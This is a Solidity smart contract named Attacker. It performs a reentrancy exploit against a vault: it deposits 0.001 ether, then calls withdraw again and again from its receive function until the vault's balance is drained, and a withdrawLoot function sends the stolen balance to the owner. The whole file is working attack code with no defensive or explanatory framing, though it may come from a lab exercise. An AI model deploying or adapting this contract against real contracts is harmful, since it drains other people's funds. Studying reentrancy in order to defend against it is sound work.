// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVault public immutable vault;
    address public immutable owner;

    uint256 public constant ATTACK_AMOUNT = 0.001 ether;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value == ATTACK_AMOUNT, "Send 0.001 POT");

        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (
            msg.sender == address(vault) &&
            address(vault).balance >= ATTACK_AMOUNT
        ) {
            vault.withdraw();
        }
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Not owner");

        (bool ok, ) = payable(owner).call{
            value: address(this).balance
        }("");
        require(ok, "Transfer failed");
    }
}
